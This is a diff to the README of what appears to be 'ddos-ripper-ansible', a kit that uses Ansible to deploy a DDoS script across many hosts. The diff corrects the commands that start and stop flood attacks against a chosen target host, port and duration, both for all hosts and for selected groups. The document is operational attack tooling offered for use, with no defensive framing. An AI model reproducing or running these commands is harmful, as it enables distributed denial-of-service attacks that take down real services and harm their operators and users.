@@ -79,7 +79,7 @@ ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -
 ### Start attack on one or several groups of hosts
 ```
 cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
-ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" -l group1,group2
+ansible group1,group2 -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" 
 ```
 ### Stop attack on all hosts
 ```
@@ -90,20 +90,20 @@ ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name -m shell -
 ## - If you use ssh key for ssh authentication:
 ```
 cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
-ansible-playbook -i ../../inventory/hosts initial-setup.yml -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key"
+ansible-playbook -i ../../inventory/hosts initial-setup.yml -b -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key"
 ```
 ### Start attack on all hosts
 ```
 cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
-ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>"
+ansible all -i ../../inventory/hosts -b -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>"
 ```
 ### Start attack on one or several groups of hosts
 ```
 cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
-ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" -l group1,group2
+ansible group1,group2 -i ../../inventory/hosts -b -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-start.sh <host> <port> <duration>" 
 ```
 ### Stop attack on all hosts
 ```
 cd /opt/git/ddos-ripper-ansible/playbooks/initial-setup
-ansible all -i ../../inventory/hosts -b -kK -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-stop.sh"
+ansible all -i ../../inventory/hosts -b -e ansible_user=user_name ansible_ssh_private_key_file="/path/to/your/ssh.key" -m shell -a "/tmp/ddos-ripper/ddos-ripper-stop.sh"
 ```
